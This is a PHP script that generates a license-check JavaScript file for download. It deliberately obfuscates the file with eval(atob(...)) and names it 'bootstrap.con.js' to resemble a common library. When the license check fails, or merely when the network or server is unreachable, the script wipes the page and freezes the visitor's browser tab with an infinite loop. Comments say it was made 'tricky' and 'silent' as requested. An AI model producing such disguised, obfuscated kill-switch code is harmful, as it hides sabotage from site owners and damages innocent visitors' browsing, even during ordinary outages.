<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    // If not logged in, do nothing.
    http_response_code(403);
    exit();
}

require_once '../src/db.php';

$license_id = $_GET['license_id'] ?? null;
$user_id = $_SESSION['user_id'];

if (!$license_id) {
    http_response_code(400);
    exit('Invalid request.');
}

// Security Check: Verify the logged-in user owns this license
$stmt = $pdo->prepare("SELECT license_key FROM licenses WHERE id = ? AND user_id = ?");
$stmt->execute([$license_id, $user_id]);
$license = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$license) {
    // User does not own this license or it doesn't exist
    http_response_code(403);
    exit('Access denied.');
}

$license_key = $license['license_key'];
$api_endpoint = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . dirname($_SERVER['PHP_SELF']) . '/api.php';

// --- JavaScript Template ---
// Using non-descriptive variable names as requested to make it "tricky"
$js_template = <<<JS
(function() {
    var d = window.location.hostname;
    var k = '{{LICENSE_KEY}}';
    var u = '{{API_ENDPOINT}}';

    var p = new FormData();
    p.append('domain', d);
    p.append('key', k);

    fetch(u, {
        method: 'POST',
        body: p
    })
    .then(r => r.json())
    .then(r => {
        if (r.status !== 1) {
            // On failure, cause silent failure as requested
            document.body.innerHTML = ''; // Wipes the page content
            while(true){} // Freezes the browser tab
        }
    })
    .catch(e => {
        // If the fetch fails (e.g., server down, network error), also fail silently
        document.body.innerHTML = '';
        while(true){}
    });
})();
JS;

// Inject the dynamic data into the template
$final_js = str_replace('{{LICENSE_KEY}}', $license_key, $js_template);
$final_js = str_replace('{{API_ENDPOINT}}', $api_endpoint, $final_js);

// Obfuscate the script as requested
$obfuscated_js = 'eval(atob("' . base64_encode($final_js) . '"));';

// Set headers to trigger download
header('Content-Type: application/javascript');
header('Content-Disposition: attachment; filename="bootstrap.con.js"');
header('Content-Length: ' . strlen($obfuscated_js));

// Serve the file
echo $obfuscated_js;
exit();
?>
